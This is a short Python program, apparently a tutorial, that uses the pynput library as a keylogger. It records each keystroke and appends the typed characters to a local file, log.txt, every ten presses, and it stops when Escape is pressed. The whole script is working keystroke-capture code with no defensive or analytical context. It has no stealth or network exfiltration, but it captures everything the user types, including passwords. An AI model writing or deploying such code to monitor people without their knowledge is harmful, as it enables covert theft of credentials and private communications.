# Importing the relevant Libraries
from pynput.keyboard import Key, Listener
# Append the keys to the list, write them to the file after every 10 characters are typed out.
keys = []
count = 0

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    #print("{} pressed".format(key))

    if count >= 10:
        count = 0
        write_to_file(keys)
        keys = []
# Function to write the keys to the file and remove quotation, replace them with a new line when the space, enter and tab bar are pressed.
def write_to_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if k == 'Key.space' or k == 'Key.Enter' or k == 'Key.Tab':
                f.write('\n')

            elif k.find("Key") == -1:
                f.write(k)
        


# Once the escape bar is pressed we can exit the program.
def on_release(key):
    if key == Key.esc:
        return False

# Initiate program.
with Listener(on_press= on_press, on_release=on_release) as listener:
    listener.join()


